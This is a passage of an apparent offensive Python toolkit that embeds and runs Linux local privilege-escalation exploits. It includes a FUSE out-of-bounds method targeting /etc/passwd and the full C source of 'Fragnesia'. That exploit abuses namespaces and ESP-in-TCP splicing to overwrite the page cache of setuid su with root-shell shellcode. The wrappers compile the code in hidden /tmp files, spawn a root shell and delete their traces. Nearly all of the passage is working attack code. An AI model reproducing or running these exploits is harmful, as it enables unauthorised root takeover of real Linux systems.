def _fuse_oob_v2_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _fuse_oob_v2_compile_and_run():
    """Tulis source C, compile, jalankan. Return True kalau root."""
    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        log("[-] No gcc/cc — skip compile")
        return False
    log("[+] compiler: %s" % cc)

    tag = "%08x" % (os.getpid() ^ int(time.time()))
    c_path = "/tmp/.fv2_%s.c" % tag
    bin_path = "/tmp/.fv2_%s" % tag

    try:
        with open(c_path, "w") as f:
            f.write(FUSE_OOB_V2_C_SOURCE)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[*] compiling...")
    try:
        r = subprocess.run(
            [cc, "-O2", "-w", "-o", bin_path, c_path, "-pthread"],
            capture_output=True, timeout=300
        )
        if r.returncode != 0:
            err = r.stderr.decode(errors="replace")[:400]
            log("[-] compile failed: %s" % err)
            _fuse_oob_v2_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] compile error: %s" % e)
        _fuse_oob_v2_cleanup(c_path, bin_path)
        return False

    if not os.path.isfile(bin_path):
        log("[-] binary not produced")
        _fuse_oob_v2_cleanup(c_path, bin_path)
        return False

    try:
        os.chmod(bin_path, 0o755)
    except OSError:
        pass
    log("[+] compiled: %s" % bin_path)

    log("[*] running FUSE OOB v2 (timeout 300s)...")
    try:
        p = subprocess.Popen([bin_path])
        try:
            p.wait(timeout=300)
            rc = p.returncode
        except subprocess.TimeoutExpired:
            p.kill()
            try:
                p.wait(timeout=5)
            except Exception:
                pass
            log("[-] timeout")
            _fuse_oob_v2_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] run error: %s" % e)
        _fuse_oob_v2_cleanup(c_path, bin_path)
        return False

    _fuse_oob_v2_cleanup(c_path, bin_path)

    # verifikasi /etc/passwd mulai root::
    try:
        with open("/etc/passwd", "r") as f:
            if f.readline().startswith("root::"):
                return True
    except OSError:
        pass
    if os.geteuid() == 0:
        return True
    if rc == 0:
        return True
    return False


def _fuse_oob_v2():
    """M9 v2 — FUSE readdir OOB + PCP drain (target /etc/passwd)."""
    log("\n[--- METHOD 9 v2: FUSE readdir OOB (PCP drain) ---]")

    if os.geteuid() == 0:
        log("[+] already root")
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    # cek page size 4096
    try:
        page = os.sysconf("SC_PAGE_SIZE")
        if page != 4096:
            log("[-] page size %d != 4096 — skip" % page)
            return False
    except Exception:
        pass

    # cek /dev/fuse
    if not os.path.exists("/dev/fuse"):
        log("[-] /dev/fuse not found — skip")
        return False

    # cek fusermount3
    fm = shutil.which("fusermount3")
    if not fm:
        log("[-] fusermount3 not found — skip")
        return False

    # cek /etc/passwd writable-deny (should be denied)
    if os.access("/etc/passwd", os.W_OK):
        log("[!] /etc/passwd writable — skip (unexpected)")
        return False

    if _fuse_oob_v2_compile_and_run():
        log("[+++] FUSE OOB v2 succeeded — root")
        _reattach_tty()
        os.execl("/bin/su", "su", "-s", "/bin/sh", "root")
        return True

    log("[-] FUSE OOB v2 failed")
    return False

# ──────────────────────────────────────────────────
# METHOD 10: Fragnesia (universal Linux LPE — ESP-in-TCP page cache)
# ──────────────────────────────────────────────────

FRAGNESIA_C_SOURCE = r'''
/*
 * Fragnesia: universal Linux LPE
 * Ubuntu users: AppArmor interferes with using namespaces, you need to use
 * `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0`.
 *
 * Modified for Smoky M10 integration:
 *   - Auto-detect setuid-root su binary
 *   - Skip if su already patched (marker check)
 *   - Cleanup /tmp artifacts
 */
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/if_alg.h>
#include <linux/netlink.h>
#include <linux/udp.h>
#include <linux/xfrm.h>
#include <limits.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef TCP_ULP
#define TCP_ULP 31
#endif
#ifndef NETLINK_XFRM
#define NETLINK_XFRM 6
#endif
#ifndef TCP_ENCAP_ESPINTCP
#define TCP_ENCAP_ESPINTCP 7
#endif
#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif
#ifndef ALG_SET_OP
#define ALG_SET_OP 3
#endif
#ifndef ALG_OP_ENCRYPT
#define ALG_OP_ENCRYPT 1
#endif

#define FRAG_LEN 4096
#define ESP_GCM_ICV_LEN 16
#define ESP_GCM_ENCRYPTED_LEN (FRAG_LEN - ESP_GCM_ICV_LEN)
#define TCP_PORT 5556
#define PAYLOAD_LEN 192

#define RECEIVER_PRE_ULP_US 30000
#define SENDER_PRE_SPLICE_US 1000
#define RECEIVER_POST_ULP_US 30000

static const unsigned char xfrm_aead_key[20] = {
	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
	0x01, 0x02, 0x03, 0x04
};

static unsigned char active_esp_gcm_iv[8] = {
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
};
static uint32_t active_esp_seq = 1;
static const char *target_file;
static char target_file_buf[PATH_MAX];
static loff_t target_splice_off;

static uint16_t stream0_nonce[256];
static bool stream0_have[256];

/* 192-byte root shell ELF shellcode */
static const uint8_t shell_elf[PAYLOAD_LEN] = {
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
	0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
	0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

static void die(const char *what)
{
	fprintf(stderr, "%s: %s\n", what, strerror(errno));
	exit(2);
}

static void gate_fail(const char *what)
{
	printf("namespace_gate_failed: %s errno=%d (%s)\n",
	       what, errno, strerror(errno));
	exit(4);
}

static void store_be32(unsigned char *p, uint32_t v)
{
	p[0] = (unsigned char)(v >> 24);
	p[1] = (unsigned char)(v >> 16);
	p[2] = (unsigned char)(v >> 8);
	p[3] = (unsigned char)v;
}

/* ---- auto-detect su ---- */
static const char *SU_PATHS[] = {
	"/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su", NULL
};

static const char *find_su(void)
{
	struct stat st;
	int i;
	for (i = 0; SU_PATHS[i]; i++) {
		if (stat(SU_PATHS[i], &st) == 0 &&
		    S_ISREG(st.st_mode) &&
		    (st.st_mode & S_ISUID) &&
		    st.st_uid == 0)
			return SU_PATHS[i];
	}
	return NULL;
}

static int su_already_patched(const char *path)
{
	int fd;
	unsigned char buf[8];
	ssize_t n;

	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0) return 0;
	n = pread(fd, buf, sizeof(buf), 0x78);
	close(fd);
	if (n != 8) return 0;
	/* marker: 31 ff 31 f6 31 c0 b0 6a (awal shellcode di entry) */
	return memcmp(buf, "\x31\xff\x31\xf6\x31\xc0\xb0\x6a", 8) == 0;
}

/* ---- AF_ALG ---- */
static int open_afalg_aes_ecb(void)
{
	struct sockaddr_alg sa = { .salg_family = AF_ALG };
	int fd;

	fd = socket(AF_ALG, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
	if (fd < 0) die("socket(AF_ALG)");

	strcpy((char *)sa.salg_type, "skcipher");
	strcpy((char *)sa.salg_name, "ecb(aes)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind AF_ALG ecb(aes)");
	if (setsockopt(fd, SOL_ALG, ALG_SET_KEY, xfrm_aead_key, 16) < 0)
		die("setsockopt AF_ALG key");

	return fd;
}

static void afalg_aes_encrypt_block(int alg_fd, const unsigned char in[16], unsigned char out[16])
{
	char cbuf[CMSG_SPACE(sizeof(uint32_t))] = {};
	struct iovec iov = { .iov_base = (void *)in, .iov_len = 16 };
	struct msghdr msg = { .msg_iov = &iov, .msg_iovlen = 1, .msg_control = cbuf, .msg_controllen = sizeof(cbuf) };
	struct cmsghdr *cmsg;
	uint32_t op = ALG_OP_ENCRYPT;
	ssize_t ret;
	int op_fd;

	op_fd = accept4(alg_fd, NULL, NULL, SOCK_CLOEXEC);
	if (op_fd < 0) die("accept AF_ALG");

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_OP;
	cmsg->cmsg_len = CMSG_LEN(sizeof(op));
	memcpy(CMSG_DATA(cmsg), &op, sizeof(op));

	ret = sendmsg(op_fd, &msg, 0);
	if (ret != 16) die("sendmsg AF_ALG block");
	ret = read(op_fd, out, 16);
	if (ret != 16) die("read AF_ALG block");

	close(op_fd);
}

static unsigned char aes_gcm_stream0_byte(int alg_fd, const unsigned char iv[8])
{
	unsigned char counter_block[16], stream[16];
	memcpy(counter_block, &xfrm_aead_key[16], 4);
	memcpy(counter_block + 4, iv, 8);
	store_be32(counter_block + 12, 2);
	afalg_aes_encrypt_block(alg_fd, counter_block, stream);
	return stream[0];
}

static void build_stream0_table(void)
{
	unsigned char iv[8] = { 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc };
	unsigned int count = 0, nonce;
	int alg_fd;

	alg_fd = open_afalg_aes_ecb();
	for (nonce = 0; nonce <= 0xffff && count < 256; nonce++) {
		unsigned char b;
		store_be32(iv + 4, nonce);
		b = aes_gcm_stream0_byte(alg_fd, iv);
		if (stream0_have[b]) continue;
		stream0_have[b] = true;
		stream0_nonce[b] = (uint16_t)nonce;
		count++;
	}
	close(alg_fd);

	if (count != 256) {
		fprintf(stderr, "failed to build stream-byte table: %u/256\n", count);
		exit(2);
	}
	printf("stream0_table_entries=256\n");
}

static void choose_iv_for_stream0(unsigned char need_stream)
{
	uint16_t nonce = stream0_nonce[need_stream];
	memset(active_esp_gcm_iv, 0xcc, sizeof(active_esp_gcm_iv));
	store_be32(active_esp_gcm_iv + 4, nonce);
}

static unsigned char read_byte_at(const char *path, uint64_t off)
{
	unsigned char b;
	ssize_t ret;
	int fd;

	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0) die("open read byte");
	ret = pread(fd, &b, 1, (off_t)off);
	if (ret != 1) die("pread byte");
	close(fd);
	return b;
}

static uint64_t use_existing_target(const char *path)
{
	struct stat st;

	if (stat(path, &st) < 0) die("stat target");
	if (!S_ISREG(st.st_mode)) {
		fprintf(stderr, "target is not a regular file\n");
		exit(2);
	}
	if (st.st_size < FRAG_LEN) {
		fprintf(stderr, "target too small: size=%lld need>=%d\n",
			(long long)st.st_size, FRAG_LEN);
		exit(2);
	}
	if (snprintf(target_file_buf, sizeof(target_file_buf), "%s", path) >= (int)sizeof(target_file_buf)) {
		fprintf(stderr, "target path too long\n");
		exit(2);
	}
	target_file = target_file_buf;
	return (uint64_t)st.st_size;
}

static void verify_write_denied(const char *label)
{
	int fd;
	errno = 0;
	fd = open(target_file, O_WRONLY | O_CLOEXEC);
	if (fd >= 0) {
		close(fd);
		printf("namespace_gate_failed: %s write-open unexpectedly succeeded\n", label);
		exit(4);
	}
	printf("%s_write_open_denied=1 errno=%d (%s)\n", label, errno, strerror(errno));
}

static int write_all_file_status(const char *path, const char *buf)
{
	size_t len = strlen(buf);
	int fd, saved_errno;

	fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0) return -1;
	if (write(fd, buf, len) != (ssize_t)len) {
		saved_errno = errno;
		close(fd);
		errno = saved_errno;
		return -1;
	}
	close(fd);
	return 0;
}

static void sync_write_byte(int fd)
{
	char c = 'M';
	if (write(fd, &c, 1) != 1) die("sync write");
	close(fd);
}

static void sync_read_byte(int fd)
{
	char c;
	if (read(fd, &c, 1) != 1) die("sync read");
	close(fd);
}

static void parent_map_write_or_exit(pid_t child, const char *name, const char *data)
{
	char path[128];
	snprintf(path, sizeof(path), "/proc/%ld/%s", (long)child, name);
	if (write_all_file_status(path, data) < 0) {
		printf("namespace_gate_failed: %s errno=%d (%s)\n", path, errno, strerror(errno));
		kill(child, SIGKILL);
		waitpid(child, NULL, 0);
		exit(4);
	}
}

static void enter_mapped_userns(void)
{
	uid_t outer_uid = getuid();
	gid_t outer_gid = getgid();
	int ready_pipe[2], mapped_pipe[2], status;
	char map[128];
	pid_t child;

	if (pipe(ready_pipe) < 0) die("pipe ready");
	if (pipe(mapped_pipe) < 0) die("pipe mapped");

	child = fork();
	if (child < 0) die("fork userns mapper");

	if (child > 0) {
		close(ready_pipe[1]);
		close(mapped_pipe[0]);
		sync_read_byte(ready_pipe[0]);
		snprintf(map, sizeof(map), "0 %u 1\n", outer_uid);
		parent_map_write_or_exit(child, "uid_map", map);
		parent_map_write_or_exit(child, "setgroups", "deny\n");
		snprintf(map, sizeof(map), "0 %u 1\n", outer_gid);
		parent_map_write_or_exit(child, "gid_map", map);
		sync_write_byte(mapped_pipe[1]);
		if (waitpid(child, &status, 0) < 0) die("wait userns child");
		if (WIFEXITED(status)) exit(WEXITSTATUS(status));
		exit(2);
	}

	close(ready_pipe[0]);
	close(mapped_pipe[1]);

	if (unshare(CLONE_NEWUSER) < 0) gate_fail("unshare(CLONE_NEWUSER)");
	sync_write_byte(ready_pipe[1]);
	sync_read_byte(mapped_pipe[0]);

	if (setresgid(0, 0, 0) < 0) gate_fail("setresgid 0 in userns");
	if (setresuid(0, 0, 0) < 0) gate_fail("setresuid 0 in userns");

	printf("userns_setup: outer_uid=%u outer_gid=%u ns_uid=%d ns_gid=%d\n",
	       outer_uid, outer_gid, getuid(), getgid());
}

static void bring_loopback_up(void)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0) gate_fail("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) gate_fail("SIOCGIFFLAGS lo");
	ifr.ifr_flags |= IFF_UP;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) gate_fail("SIOCSIFFLAGS lo up");
	close(fd);
	printf("loopback_up=1\n");
}

static void add_nlattr(struct nlmsghdr *nlh, size_t maxlen, unsigned short type, const void *data, size_t len)
{
	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
	struct nlattr *nla;

	if (off + NLA_HDRLEN + len > maxlen) {
		fprintf(stderr, "netlink message too small\n");
		exit(2);
	}
	nla = (struct nlattr *)((char *)nlh + off);
	nla->nla_type = type;
	nla->nla_len = NLA_HDRLEN + len;
	memcpy((char *)nla + NLA_HDRLEN, data, len);
	nlh->nlmsg_len = off + NLA_ALIGN(nla->nla_len);
}

static int nl_ack_errno(char *buf, ssize_t len)
{
	struct nlmsghdr *nlh;
	struct nlmsgerr *err;
	for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len); nlh = NLMSG_NEXT(nlh, len)) {
		if (nlh->nlmsg_type != NLMSG_ERROR) continue;
		err = (struct nlmsgerr *)NLMSG_DATA(nlh);
		if (err->error == 0) return 0;
		errno = -err->error;
		return -1;
	}
	errno = EPROTO;
	return -1;
}

static void add_xfrm_espintcp_state(void)
{
	char reqbuf[4096], resp[4096];
	char aeadbuf[sizeof(struct xfrm_algo_aead) + sizeof(xfrm_aead_key)];
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	struct xfrm_usersa_info *xs;
	struct xfrm_algo_aead *aead;
	struct xfrm_encap_tmpl encap;
	struct nlmsghdr *nlh;
	ssize_t ret;
	int fd;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh = (struct nlmsghdr *)reqbuf;
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*xs));
	nlh->nlmsg_type = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq = 1;

	xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	if (inet_pton(AF_INET6, "::1", &xs->saddr.in6) != 1) die("inet_pton saddr");
	if (inet_pton(AF_INET6, "::1", &xs->id.daddr.in6) != 1) die("inet_pton daddr");
	xs->id.spi = htonl(0x100);
	xs->id.proto = IPPROTO_ESP;
	xs->family = AF_INET6;
	xs->mode = XFRM_MODE_TRANSPORT;
	xs->reqid = 1;
	xs->lft.soft_byte_limit = XFRM_INF;
	xs->lft.hard_byte_limit = XFRM_INF;
	xs->lft.soft_packet_limit = XFRM_INF;
	xs->lft.hard_packet_limit = XFRM_INF;

	memset(aeadbuf, 0, sizeof(aeadbuf));
	aead = (struct xfrm_algo_aead *)aeadbuf;
	snprintf(aead->alg_name, sizeof(aead->alg_name), "rfc4106(gcm(aes))");
	aead->alg_key_len = sizeof(xfrm_aead_key) * 8;
	aead->alg_icv_len = 128;
	memcpy(aead->alg_key, xfrm_aead_key, sizeof(xfrm_aead_key));
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ALG_AEAD, aeadbuf, sizeof(aeadbuf));

	memset(&encap, 0, sizeof(encap));
	encap.encap_type = TCP_ENCAP_ESPINTCP;
	encap.encap_sport = htons(TCP_PORT);
	encap.encap_dport = htons(TCP_PORT);
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ENCAP, &encap, sizeof(encap));

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_XFRM);
	if (fd < 0) gate_fail("socket(NETLINK_XFRM)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) gate_fail("bind(NETLINK_XFRM)");

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	ret = sendto(fd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa));
	if (ret < 0) gate_fail("sendto XFRM_MSG_NEWSA");
	if (ret != (ssize_t)nlh->nlmsg_len) gate_fail("short sendto");

	ret = recv(fd, resp, sizeof(resp), 0);
	if (ret < 0) gate_fail("recv XFRM ack");
	if (nl_ack_errno(resp, ret) < 0) gate_fail("XFRM_MSG_NEWSA ack");
	close(fd);
	printf("xfrm_espintcp_state_add=1\n");
}

static void setup_user_netns_xfrm(void)
{
	if (prctl(PR_SET_DUMPABLE, 1, 0, 0, 0) < 0) die("prctl PR_SET_DUMPABLE");
	enter_mapped_userns();
	if (unshare(CLONE_NEWNET) < 0) gate_fail("unshare(CLONE_NEWNET)");
	printf("netns_setup=1\n");
	bring_loopback_up();
	add_xfrm_espintcp_state();
	printf("namespace_setup_complete=1\n");
}

static void write_ready(int fd)
{
	char c = 'R';
	if (write(fd, &c, 1) != 1) die("ready write");
	close(fd);
}

static void wait_ready(int fd)
{
	char c;
	if (read(fd, &c, 1) != 1) die("ready read");
	close(fd);
}

static void receiver(int ready_write_fd)
{
	struct sockaddr_in6 addr = { .sin6_family = AF_INET6, .sin6_addr = IN6ADDR_LOOPBACK_INIT, .sin6_port = htons(TCP_PORT) };
	char ulp[] = "espintcp";
	int fd, cfd, one = 1;

	fd = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (fd < 0) die("receiver socket");
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0) die("receiver reuseaddr");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) die("receiver bind");
	if (listen(fd, 1) < 0) die("receiver listen");
	write_ready(ready_write_fd);
	cfd = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
	if (cfd < 0) die("receiver accept");
	usleep(RECEIVER_PRE_ULP_US);
	if (setsockopt(cfd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp)) < 0) die("receiver TCP_ULP espintcp");
	printf("receiver_ns_uid=%d euid=%d\n", getuid(), geteuid());
	usleep(RECEIVER_POST_ULP_US);
	close(cfd);
	close(fd);
	_exit(0);
}

static void sender(int ready_read_fd)
{
	struct sockaddr_in6 dst = { .sin6_family = AF_INET6, .sin6_addr = IN6ADDR_LOOPBACK_INIT, .sin6_port = htons(TCP_PORT) };
	struct { __be16 len; unsigned char esp[16]; } prefix;
	loff_t off, start_off;
	int fd, sock, p[2], one = 1;
	ssize_t ret, sent;

	wait_ready(ready_read_fd);
	memset(&prefix, 0xcc, sizeof(prefix));
	prefix.len = htons(sizeof(prefix) + FRAG_LEN);
	prefix.esp[0] = 0x00; prefix.esp[1] = 0x00; prefix.esp[2] = 0x01; prefix.esp[3] = 0x00;
	store_be32(&prefix.esp[4], active_esp_seq);
	memcpy(&prefix.esp[8], active_esp_gcm_iv, sizeof(active_esp_gcm_iv));

	fd = open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd < 0) die("sender open target");
	sock = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (sock < 0) die("sender socket");
	if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)) < 0) die("sender TCP_NODELAY");
	if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) < 0) die("sender connect");

	sent = send(sock, &prefix, sizeof(prefix), 0);
	if (sent != (ssize_t)sizeof(prefix)) die("sender send prefix");
	usleep(SENDER_PRE_SPLICE_US);

	if (pipe(p) < 0) die("sender pipe");
	off = target_splice_off;
	start_off = off;
	ret = splice(fd, &off, p[1], NULL, FRAG_LEN, 0);
	if (ret != FRAG_LEN) die("sender splice file to pipe");
	ret = splice(p[0], NULL, sock, NULL, FRAG_LEN, 0);
	if (ret < 0) die("sender splice pipe to tcp");

	printf("sender_ns_uid=%d euid=%d splice=%zd off=%lld\n",
	       getuid(), geteuid(), ret, (long long)start_off);

	close(p[0]); close(p[1]); close(sock); close(fd);
	_exit(ret == FRAG_LEN ? 0 : 3);
}

static int run_trigger_pair(void)
{
	int pipefd[2], st_rx, st_tx;
	pid_t rx, tx;

	if (pipe(pipefd) < 0) die("pipe");
	rx = fork();
	if (rx < 0) die("fork receiver");
	if (rx == 0) { close(pipefd[0]); receiver(pipefd[1]); }

	tx = fork();
	if (tx < 0) die("fork sender");
	if (tx == 0) { close(pipefd[1]); sender(pipefd[0]); }

	close(pipefd[0]); close(pipefd[1]);
	if (waitpid(tx, &st_tx, 0) < 0) die("wait sender");
	if (waitpid(rx, &st_rx, 0) < 0) die("wait receiver");
	if (!WIFEXITED(st_tx) || WEXITSTATUS(st_tx) != 0 ||
	    !WIFEXITED(st_rx) || WEXITSTATUS(st_rx) != 0)
		return -1;
	return 0;
}

static int replace_existing_bytes_after(uint64_t byte_off, const unsigned char *desired,
					size_t desired_len, uint64_t file_size)
{
	uint64_t last = byte_off + desired_len - 1;
	size_t idx, changed = 0, skipped = 0;
	int fd_init;

	if (last >= file_size) {
		fprintf(stderr, "byte range outside target\n");
		return 2;
	}

	printf("timing: rx_pre_ulp=%uus tx_pre_splice=%uus rx_post_ulp=%uus\n",
	       RECEIVER_PRE_ULP_US, SENDER_PRE_SPLICE_US, RECEIVER_POST_ULP_US);
	printf("range: offset=0x%llx len=%zu\n",
	       (unsigned long long)byte_off, desired_len);

	build_stream0_table();

	fd_init = open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd_init < 0) die("open live_state init");
	close(fd_init);

	for (idx = 0; idx < desired_len; idx++) {
		uint64_t off = byte_off + idx;
		unsigned char current, final, need_stream;

		current = read_byte_at(target_file, off);

		if (current == desired[idx]) {
			skipped++;
			continue;
		}

		target_splice_off = (loff_t)off;
		need_stream = current ^ desired[idx];
		choose_iv_for_stream0(need_stream);
		active_esp_seq++;

		printf("[%zu/%zu] +%04llx %02x -> %02x xor=%02x seq=%u\n",
		       idx + 1, desired_len, (unsigned long long)off,
		       current, desired[idx], need_stream, active_esp_seq);

		if (run_trigger_pair() < 0) {
			fprintf(stderr, "[-] trigger pair failed at idx=%zu\n", idx);
			return 2;
		}

		final = read_byte_at(target_file, off);
		if (final == desired[idx]) {
			printf("[+] smashed %02x -> %02x at +%04llx\n\n",
			       current, final, (unsigned long long)off);
			changed++;
			continue;
		}
		if (final == current) {
			printf("[-] fixed behavior: byte unchanged at idx=%zu\n", idx);
			return 0;
		}
		printf("[-] byte changed but wrong value at idx=%zu\n", idx);
		return 1;
	}

	printf("bytes_flip_summary len=%zu changed=%zu skipped=%zu\n",
	       desired_len, changed, skipped);
	if (changed == 0) {
		fprintf(stderr, "all requested bytes already had desired values\n");
		return 2;
	}
	printf("[+] changed requested copied byte range to desired values\n");
	return 1;
}

int main(int argc, char **argv)
{
	const char *su_path;
	uint64_t file_size, byte_off;
	int ret;

	setvbuf(stdout, NULL, _IONBF, 0);

	(void)argc; (void)argv;

	printf("[*] Fragnesia uid=%d euid=%d gid=%d\n",
	       getuid(), geteuid(), getgid());

	if (geteuid() == 0) {
		execl("/bin/sh", "sh", NULL);
		return 0;
	}

	su_path = find_su();
	if (!su_path) {
		fprintf(stderr, "[-] no setuid-root su found\n");
		return 2;
	}
	printf("[*] su target: %s\n", su_path);

	if (su_already_patched(su_path)) {
		printf("[+] su already patched — exec\n");
		execl(su_path, su_path, NULL);
		return 0;
	}

	file_size = use_existing_target(su_path);
	byte_off = 0;

	printf("[*] target=%s size=%llu\n", target_file, (unsigned long long)file_size);
	verify_write_denied("outer");
	setup_user_netns_xfrm();
	verify_write_denied("userns_root_mapped_to_outer_user");

	ret = replace_existing_bytes_after(byte_off, shell_elf, PAYLOAD_LEN, file_size);
	execve(su_path, NULL, NULL);
	return ret;
}
'''
def _fragnesia_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _fragnesia_compile_and_run():
    """Tulis source C, compile, jalankan. Return True kalau root."""
    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        log("[-] No gcc/cc — skip compile")
        return False
    log("[+] compiler: %s" % cc)

    tag = "%08x" % (os.getpid() ^ int(time.time()))
    c_path = "/tmp/.fr_%s.c" % tag
    bin_path = "/tmp/.fr_%s" % tag

    try:
        with open(c_path, "w") as f:
            f.write(FRAGNESIA_C_SOURCE)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[*] compiling (static)...")
    try:
        r = subprocess.run(
            [cc, "-O2", "-w", "-static", "-o", bin_path, c_path],
            capture_output=True, timeout=300
        )
        if r.returncode != 0:
            # fallback tanpa static
            log("[!] static compile failed, retry dynamic")
            r = subprocess.run(
                [cc, "-O2", "-w", "-o", bin_path, c_path],
                capture_output=True, timeout=300
            )
            if r.returncode != 0:
                err = r.stderr.decode(errors="replace")[:400]
                log("[-] compile failed: %s" % err)
                _fragnesia_cleanup(c_path, bin_path)
                return False
    except Exception as e:
        log("[-] compile error: %s" % e)
        _fragnesia_cleanup(c_path, bin_path)
        return False

    if not os.path.isfile(bin_path):
        log("[-] binary not produced")
        _fragnesia_cleanup(c_path, bin_path)
        return False

    try:
        os.chmod(bin_path, 0o755)
    except OSError:
        pass
    log("[+] compiled: %s" % bin_path)

    log("[*] running Fragnesia (timeout 600s)...")
    try:
        p = subprocess.Popen([bin_path])
        try:
            p.wait(timeout=600)
            rc = p.returncode
        except subprocess.TimeoutExpired:
            p.kill()
            try:
                p.wait(timeout=5)
            except Exception:
                pass
            log("[-] timeout")
            _fragnesia_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] run error: %s" % e)
        _fragnesia_cleanup(c_path, bin_path)
        return False

    _fragnesia_cleanup(c_path, bin_path)

    # cek /usr/bin/su sudah ter-patch
    for su_path in ["/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su"]:
        try:
            with open(su_path, "rb") as f:
                f.seek(0x78)
                marker = f.read(8)
                if marker == b"\x31\xff\x31\xf6\x31\xc0\xb0\x6a":
                    return True
        except OSError:
            continue
    if os.geteuid() == 0:
        return True
    if rc == 0:
        return True
    return False


def try_fragnesia():
